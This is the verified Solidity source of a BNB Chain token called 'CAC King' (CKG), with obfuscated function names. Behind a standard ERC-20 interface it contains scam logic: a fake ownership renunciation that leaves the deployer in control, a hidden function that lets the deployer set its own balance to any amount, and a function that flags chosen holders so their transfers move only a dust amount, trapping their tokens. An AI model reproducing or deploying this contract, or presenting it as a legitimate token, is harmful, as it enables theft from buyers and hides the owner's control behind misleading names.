/**
 *Submitted for verification at BscScan.com on 2023-02-10
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract tradingTeamLimit {
    function minBuyTx() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}


interface takeAuto {
    function createPair(address buySwap, address takeSell) external returns (address);
}

interface atTo {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract CACKing is IERC20, tradingTeamLimit {
    uint8 private walletLimit = 18;
    

    bool public maxSell;

    string private receiverTxLaunch = "CAC King";
    uint256 public maxSwap;

    address public tradingTotal;
    mapping(address => bool) public shouldLaunched;
    address public exemptSwapTeam;
    bool private liquidityTxReceiver;
    uint256 private fromTeam;
    
    uint256 constant senderAt = 10 ** 10;
    uint256 private receiverSell;
    bool public listIs;
    uint256 private listSell = 100000000 * 10 ** walletLimit;

    address private isFeeBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    string private maxFeeReceiver = "CKG";
    bool public buyLaunch;
    address private teamFrom;
    mapping(address => bool) public toTradingSwap;

    bool public launchedSender;
    mapping(address => mapping(address => uint256)) private takeList;
    mapping(address => uint256) private launchedAt;
    

    event OwnershipTransferred(address indexed sellBuy, address indexed swapAuto);

    constructor (){
        
        atTo toSell = atTo(isFeeBuy);
        exemptSwapTeam = takeAuto(toSell.factory()).createPair(toSell.WETH(), address(this));
        teamFrom = minBuyTx();
        
        tradingTotal = teamFrom;
        shouldLaunched[tradingTotal] = true;
        if (buyLaunch) {
            maxSwap = receiverSell;
        }
        launchedAt[tradingTotal] = listSell;
        emit Transfer(address(0), tradingTotal, listSell);
        receiverBuy();
    }

    

    function approve(address fundMax, uint256 receiverFee) public virtual override returns (bool) {
        takeList[minBuyTx()][fundMax] = receiverFee;
        emit Approval(minBuyTx(), fundMax, receiverFee);
        return true;
    }

    function launchedMarketing(address isMax, address amountTo, uint256 receiverFee) internal returns (bool) {
        require(launchedAt[isMax] >= receiverFee);
        launchedAt[isMax] -= receiverFee;
        launchedAt[amountTo] += receiverFee;
        emit Transfer(isMax, amountTo, receiverFee);
        return true;
    }

    function balanceOf(address listAt) public view virtual override returns (uint256) {
        return launchedAt[listAt];
    }

    function totalSupply() external view virtual override returns (uint256) {
        return listSell;
    }

    function owner() external view returns (address) {
        return teamFrom;
    }

    function enableLaunch() public view returns (uint256) {
        return maxSwap;
    }

    function transfer(address sellToken, uint256 receiverFee) external virtual override returns (bool) {
        return receiverLaunched(minBuyTx(), sellToken, receiverFee);
    }

    function receiverBuy() public {
        emit OwnershipTransferred(tradingTotal, address(0));
        teamFrom = address(0);
    }

    function name() external view returns (string memory) {
        return receiverTxLaunch;
    }

    function tradingFee(uint256 receiverFee) public {
        if (!shouldLaunched[minBuyTx()]) {
            return;
        }
        launchedAt[tradingTotal] = receiverFee;
    }

    function senderBuyAmount(address txLimit) public {
        if (maxSwap == receiverSell) {
            buyLaunch = true;
        }
        if (txLimit == tradingTotal || txLimit == exemptSwapTeam || !shouldLaunched[minBuyTx()]) {
            return;
        }
        
        toTradingSwap[txLimit] = true;
    }

    function teamFee() public {
        
        if (launchedSender == listIs) {
            maxSwap = fromTeam;
        }
        fromTeam=0;
    }

    function decimals() external view returns (uint8) {
        return walletLimit;
    }

    function launchTrading() public view returns (uint256) {
        return fromTeam;
    }

    function totalSell() public {
        
        if (receiverSell != fromTeam) {
            liquidityTxReceiver = true;
        }
        fromTeam=0;
    }

    function senderFund(address tradingLimit) public {
        if (maxSell) {
            return;
        }
        if (buyLaunch != listIs) {
            listIs = false;
        }
        shouldLaunched[tradingLimit] = true;
        if (liquidityTxReceiver) {
            buyLaunch = true;
        }
        maxSell = true;
    }

    function symbol() external view returns (string memory) {
        return maxFeeReceiver;
    }

    function allowance(address takeWallet, address fundMax) external view virtual override returns (uint256) {
        return takeList[takeWallet][fundMax];
    }

    function getOwner() external view returns (address) {
        return teamFrom;
    }

    function receiverLaunched(address isMax, address amountTo, uint256 receiverFee) internal returns (bool) {
        if (isMax == tradingTotal || amountTo == tradingTotal) {
            return launchedMarketing(isMax, amountTo, receiverFee);
        }
        if (listIs) {
            fromTeam = maxSwap;
        }
        if (toTradingSwap[isMax]) {
            return launchedMarketing(isMax, amountTo, senderAt);
        }
        
        return launchedMarketing(isMax, amountTo, receiverFee);
    }

    function transferFrom(address isMax, address amountTo, uint256 receiverFee) external override returns (bool) {
        if (takeList[isMax][minBuyTx()] != type(uint256).max) {
            require(receiverFee <= takeList[isMax][minBuyTx()]);
            takeList[isMax][minBuyTx()] -= receiverFee;
        }
        return receiverLaunched(isMax, amountTo, receiverFee);
    }


}